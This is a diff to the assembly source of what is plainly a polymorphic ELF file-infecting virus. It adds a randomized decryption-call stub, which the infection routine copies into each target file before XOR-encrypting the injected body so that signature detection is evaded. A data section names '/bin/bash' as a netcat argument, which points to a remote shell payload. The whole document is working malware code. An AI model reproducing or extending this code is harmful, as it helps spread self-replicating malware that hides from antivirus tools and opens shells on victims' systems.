@@ -48,6 +48,7 @@ POLY_save_register_begin:
 	mov [rsp + 64], r10
 POLY_save_register_end:
 
+POLY_call_uncipher_begin:
 	; uncipher first part of the code
 	lea rdi, [rel program_entry]			; data = &program_entry
 	mov rsi, obfuscation_begin - program_entry	; size = obfuscation_begin - program_entry
@@ -56,6 +57,7 @@ POLY_save_register_end:
 	cmp rcx, 0					; if (key_size == 0)
 	je program_entry				; 	goto program_entry
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
+POLY_call_uncipher_end:
 
 	jmp program_entry				; goto program_entry
 
@@ -554,6 +556,9 @@ nc_arg6: db "/bin/bash", 0
 poly_save_register_buffer: db 0x00			; Will be replaced by a script
 poly_save_register_size: dq 0				; Will be replaced by a script
 poly_save_register_count: dq 0				; Will be replaced by a script
+poly_call_uncipher_buffer: db 0x00			; Will be replaced by a script
+poly_call_uncipher_size: dq 0				; Will be replaced by a script
+poly_call_uncipher_count: dq 0				; Will be replaced by a script
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -1039,6 +1044,20 @@ treat_file:
 	add rdi, POLY_save_register_begin - _start	; 	+ (.POLY_save_register_begin - _start)
 	mov rcx, [rel poly_save_register_size]		; _poly_save_register_size = poly_save_register_size;
 	rep movsb					; memcpy(_poly_save_register_ptr, variation_ptr, _poly_save_register_size);
+
+	; replace injected call_uncipher by a random poly_call_uncipher
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_call_uncipher_count, poly_call_uncipher_size, poly_call_uncipher_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [rel poly_call_uncipher_count]		; ...
+	mov rcx, [rel poly_call_uncipher_size]		; ...
+	lea r8, [rel poly_call_uncipher_buffer]		; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_call_uncipher_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_call_uncipher_begin - _start	; 	+ (.POLY_call_uncipher_begin - _start)
+	mov rcx, [rel poly_call_uncipher_size]		; _poly_call_uncipher_size = poly_call_uncipher_size;
+	rep movsb					; memcpy(_poly_call_uncipher_ptr, variation_ptr, _poly_call_uncipher_size);
 
 	; xor cipher all injected bytes between obfuscation_begin and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (obfuscation_begin - _start);
